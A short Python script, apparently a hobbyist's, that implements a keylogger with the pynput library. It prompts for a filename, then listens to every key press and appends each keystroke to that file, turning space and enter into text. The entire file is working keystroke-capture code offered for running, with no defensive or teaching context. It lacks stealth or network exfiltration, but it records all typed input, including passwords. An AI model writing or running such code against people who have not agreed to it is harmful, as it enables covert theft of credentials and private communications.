# Importing OS module.
import os.path
# Pynput - Library for controlling input streams.
from pynput.keyboard import Controller, Listener

# Appending information from the keyboard.
def keyLogger(key):
	letter = str(key)
	letter = letter.replace("'","")
	
	if letter == 'Key.space':
		letter = ' '
	if letter == "Key.enter":
		letter = '\n'
	
	# with command automatically releases memory allocation.
	with open(fn, 'a') as f: 
		f.write(letter)

# def controlKeyboard():
#	keyboard = Controller()
#	keyboard.type("awesome")

def listenKeys():
	with Listener(on_press=keyLogger) as l:
		l.join()

# Checking if the file exist or not. If not, create it.
fn = input("Enter a filename to read: ")
if os.path.isfile(fn):
	print("File already exists.\n")
	print("Proceed to Keylogger Program.")
	listenKeys()
else:
	print("File does not exist. Creating file.")
	newFile = open(fn, 'w')
	listenKeys()
	
# controlKeyboard()

# To run this in bash script:

# python name.py
